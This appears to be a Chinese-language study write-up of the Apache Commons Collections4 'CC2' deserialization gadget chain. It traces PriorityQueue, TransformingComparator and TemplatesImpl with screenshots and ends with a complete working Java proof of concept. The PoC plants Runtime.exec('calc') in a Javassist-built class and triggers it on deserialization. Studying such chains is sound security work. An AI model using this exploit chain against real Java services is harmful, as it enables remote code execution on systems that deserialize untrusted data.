# Apache Commons Collections2 反序列化漏洞分析


# 前言

继续学习cc链，重点在于新知识的学习和运用

# 环境搭建

创建maven项目，pox.xml修改为如下内容

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc2</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>7</maven.compiler.source>
        <maven.compiler.target>7</maven.compiler.target>
    </properties>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <source>6</source>
                    <target>6</target>
                </configuration>
            </plugin>
        </plugins>
    </build>
    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>

        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.25.0-GA</version>
        </dependency>
    </dependencies>
</project>
```

> 这里jdk版本是7u80

# 前置知识

## PriorityQueue

1. PriorityQueue 是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的Comparator 在队列实例化的时排序。
2. PriorityQueue 不允许空值，而且不支持 non-comparable（不可比较）的对象，比如用户自定义的类。优先队列要求使用 Java Comparable 和 Comparator 接口给对象排序，并且在排序时会按照优先级处理其中的元素。
3. PriorityQueue 的大小是不受限制的，但在创建时可以指定初始大小。当我们向优先队列增加元素的时候，队列大小会自动增加。

## Javassist

Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含一个 Java 类或接口。Javaassist 就是一个用来 处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。

## TemplatesImpl

1. TemplatesImpl 的属性`_bytecodes`存储了类字节码
2. TemplatesImpl 类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是 AbstractTranslet
3. 在这个类的无参构造方法或静态代码块中写入恶意代码，再借 TemplatesImpl 之手实例化这个类触发恶意代码

# 漏洞分析

先来看一下ysoserial的gadget

```
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```

先进入到`java.util.PriorityQueue#readObject`中看一下，这里会进入到`heapify()`中

![1.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/a4d0e57e-eff7-df78-bd50-d3705e66eb96.png)

跟进到`heapify()`中后，会进入到`siftDown()`中

![2.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1541cd96-6126-8b8f-b4b2-3592a834b1d1.png)

继续跟进，如果`comparator`的值不为空则会进入到`siftDownUsingComparator()`中

![3.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1dc3e812-87f1-d8c1-125f-28e6abd69de0.png)

在`siftDownUsingComparator()`方法中，会调用`comparator.compare()`方法去进行排序和对比，此时new一个`TransformingComparator`类型的对象，则会进入到`org.apache.commons.collections4.comparators.TransformingComparator#compare`中

![4.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/77a4c8f7-d9ad-1508-a647-9ad53051eee4.png)

而在`org.apache.commons.collections4.comparators.TransformingComparator#compare`中，会去调用`this.transformer.transform()`，到这里应该就很熟悉了，在往下会去调用`org.apache.commons.collections4.functors.InvokerTransformer#transform`，可以通过反射去执行命令

![5.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/41267a0c-8352-fde7-e446-e6beef404da3.png)

下面是ysoserial的exp

```
public Queue<Object> getObject(final String command) throws Exception {
	final Object templates = Gadgets.createTemplatesImpl(command);
	// mock method name until armed
	final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

	// create queue with numbers and basic comparator
	final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
	// stub data for replacement later
	queue.add(1);
	queue.add(1);

	// switch method called by comparator
	Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

	// switch contents of queue
	final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
	queueArray[0] = templates;
	queueArray[1] = 1;

	return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections2.class, args);
	}
```

这里大概的介绍一下整个流程，首先通过`Javassist`向`TemplatesImpl`的`_bytecodes`字段中加入想要执行的命令，然后通过反射将其加入到`PriorityQueue`队列中，到最后触发命令

而其并不是和cc5一样通过反射去执行命令，而是触发`newTransformer`方法实例化恶意类达到命令执行的效果，在`newTransformer`方法中会进入到`getTransletInstance()`

![6.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5de4d689-aaa7-432f-cc91-5edf8df6f46e.png)

跟进到`getTransletInstance()`中，`_class == null`进入到`defineTransletClasses()`中，然后会将`_bytecodes`的值赋值给`_class`，然和返回到`getTransletInstance()`中

![7.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/61c44613-ce59-12a7-c5b9-38667bfa0358.png)

![8.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/028ff439-2d47-e1e0-f903-d22d30e95ffd.png)

`_class.newInstance()`会对`_class`进行实例化，从而触发命令，这里是因为通过`Javassist`构造了一个恶意类，恶意类的内容为`Runtime.getRuntime().exec("calc");`，因此实例化时会执行命令

![9.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/9ef94d69-e0c6-f7ed-0670-051e9dadb964.png)

**POC如下：**

```
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class cc2 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
        CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime

        byte[] bytes=payload.toBytecode();//转换为byte数组

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
        field.setAccessible(true);
        field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组

        Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
        field1.setAccessible(true);
        field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test

        InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
        queue.add(1);//添加数字1插入此优先级队列
        queue.add(1);//添加数字1插入此优先级队列

        Field field2=queue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段
        field2.setAccessible(true);
        field2.set(queue,comparator);//设置queue的comparator字段值为comparator

        Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
        field3.setAccessible(true);
        field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.ser"));
        inputStream.readObject();

    }
}
```

运行结果如下：

![10.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dce432db-b9c6-a34c-fd06-5c857cb4d25d.png)

# 参考链接

1. https://www.cnblogs.com/nice0e3/p/13860621.html
2. https://su18.org/post/ysoserial-su18-2/#commonscollections2

